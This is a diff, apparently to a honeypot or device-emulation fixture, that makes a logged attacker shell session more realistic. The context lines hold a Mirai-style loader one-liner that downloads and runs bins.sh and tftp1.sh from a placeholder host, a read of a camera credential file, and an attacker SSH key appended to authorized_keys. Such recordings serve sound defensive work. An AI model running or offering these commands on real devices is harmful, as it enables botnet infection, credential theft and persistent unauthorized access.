@@ -17,9 +17,9 @@ MIRAI: applet not found
 [exit 127]
 $ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.51.100.7/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 198.51.100.7 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; rm -rf bins.sh tftp1.sh
 Connecting to 198.51.100.7 (198.51.100.7:80)
-saving to 'bins.sh'
-bins.sh              100% |********************************|    10  0:00:00 ETA
-'bins.sh' saved
+wget: can't connect to remote host (198.51.100.7): Connection timed out
+chmod: bins.sh: No such file or directory
+sh: can't open 'bins.sh': No such file or directory
 BusyBox v1.31.1 (2021-03-12 11:24:03 CST) multi-call binary.
 
 Usage: tftp [OPTIONS] HOST [PORT]
@@ -39,9 +39,9 @@ $ for d in /tmp /var /dev /mnt; do touch $d/.w && echo $d writable && rm $d/.w; 
 touch: /mnt/.w: Read-only file system
 [exit 1]
 $ ls -la /tmp
-total 8
-drwxrwxrwt  2 root root 4096 Nov 17 12:00 .
-drwxr-xr-x 16 root root 4096 Feb 10  2025 ..
+total 0
+drwxrwxrwt    2 root     root            40 Nov 17 20:02 ^[[1;34m.^[[0m
+drwxr-xr-x   16 root     root           161 Mar 12  2021 ^[[1;34m..^[[0m
 $ cat /mnt/mtd/Config/Account
 [admin]
 password=Cam!2021admin
@@ -53,6 +53,6 @@ $ echo 'ssh-rsa AAAA attacker' >> /root/.ssh/authorized_keys
 sh: can't create /root/.ssh/authorized_keys: nonexistent directory
 [exit 1]
 $ nohup ./x &
-[1] 25084
+[1] 8223
 sh: nohup: not found
 $ history
